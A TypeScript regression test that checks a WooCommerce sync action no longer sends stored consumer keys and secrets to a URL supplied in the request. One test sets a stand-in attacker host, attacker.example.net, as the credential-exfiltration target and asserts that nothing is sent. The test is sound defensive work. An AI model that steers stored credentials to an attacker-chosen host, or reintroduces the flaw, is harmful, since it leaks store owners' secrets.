import assert from 'node:assert/strict'
import { SECRET_MASK } from '@/lib/security/secret-mask'
import test, { before, mock } from 'node:test'

/**
 * testWcCredentials / saveWcCredentials replaced a masked or blank key and secret with the STORED ones
 * and then called the store at the URL in the request, so anyone holding the sync permission could
 * send the stored consumer key and secret to a host of their choosing. Stored credentials may now
 * only be used against the stored store URL; a different URL needs credentials typed in the request.
 */

const STORED_URL = 'https://shop.example.com'
const STORED_KEY = 'ck_stored_key'
const STORED_SECRET = 'cs_stored_secret'

mock.module('@/lib/auth', {
  namedExports: {
    auth: async () => ({
      user: {
        id: 'u1', email: 'u@example.test', name: 'U', role: 'MANAGER',
        sessionAuthTime: Math.floor(Date.now() / 1000),
      },
    }),
  },
})

const SETTINGS: Record<string, string> = {
  wc_url: STORED_URL,
  wc_consumer_key: STORED_KEY,
  wc_consumer_secret: STORED_SECRET,
}
mock.module('@/lib/db', {
  namedExports: {
    db: new Proxy({}, {
      get: (_t, model) => {
        if (typeof model !== 'string' || model === 'then') return undefined
        if (model.startsWith('$')) return async () => null
        return new Proxy({}, {
          get: (_t2, op) => async (args?: { where?: { key?: string | { in: string[] } } }) => {
            if (model === 'setting' && op === 'updateMany') return { count: 0 }
            if (model === 'setting' && op === 'findUnique') {
              const key = typeof args?.where?.key === 'string' ? args.where.key : ''
              return key in SETTINGS ? { key, value: SETTINGS[key] } : null
            }
            if (model === 'setting' && op === 'findMany') {
              const keys = (args?.where?.key as { in: string[] } | undefined)?.in ?? []
              return keys.filter((k) => k in SETTINGS).map((key) => ({ key, value: SETTINGS[key] }))
            }
            return op === 'findMany' ? [] : null
          },
        })
      },
    }),
  },
})

const sent: Array<{ url: string; authorization: string }> = []
before(async () => {
  const realConnectorFetch = await import('@/lib/security/connector-fetch')
  mock.module('@/lib/security/connector-fetch', {
    namedExports: {
      ...realConnectorFetch,
      connectorFetch: async (url: URL, init?: { headers?: Record<string, string> }) => {
        sent.push({ url: url.toString(), authorization: init?.headers?.Authorization ?? '' })
        return new Response('{}', { status: 401, headers: { 'content-type': 'application/json' } })
      },
    },
  })
})

const STORED_BASIC = `Basic ${Buffer.from(`${STORED_KEY}:${STORED_SECRET}`).toString('base64')}`

test('a masked key and blank secret against a DIFFERENT url send nothing and use no stored credential', async () => {
  sent.length = 0
  const { testWcCredentials, saveWcCredentials } = await import('@/app/actions/wc-sync')
  const tested = await testWcCredentials('https://attacker.example.net', SECRET_MASK, '')
  assert.equal(tested.success, false)
  assert.match(tested.error ?? '', /consumer key and secret/)
  const saved = await saveWcCredentials('https://attacker.example.net', SECRET_MASK, '')
  assert.equal(saved.success, false)
  assert.deepEqual(sent.filter((request) => request.authorization === STORED_BASIC), [], 'the stored credentials were sent')
  assert.deepEqual(sent.filter((request) => request.url.includes('attacker.example.net')), [], 'a request went to the other host')
})

test('credentials typed into the request may be tested against a new url', async () => {
  sent.length = 0
  const { testWcCredentials } = await import('@/app/actions/wc-sync')
  await testWcCredentials('https://other-shop.example.org', 'ck_typed', 'cs_typed')
  assert.ok(sent.length > 0)
  assert.ok(sent.every((request) => request.url.startsWith('https://other-shop.example.org/') && request.authorization !== STORED_BASIC))
})

test('positive control: masked credentials against the stored url still use the stored credentials', async () => {
  sent.length = 0
  const { testWcCredentials } = await import('@/app/actions/wc-sync')
  await testWcCredentials(`${STORED_URL}/`, SECRET_MASK, '')
  assert.ok(sent.length > 0, 'the stored-url test did not reach the store')
  assert.ok(sent.every((request) => request.url.startsWith(`${STORED_URL}/`) && request.authorization === STORED_BASIC))
})
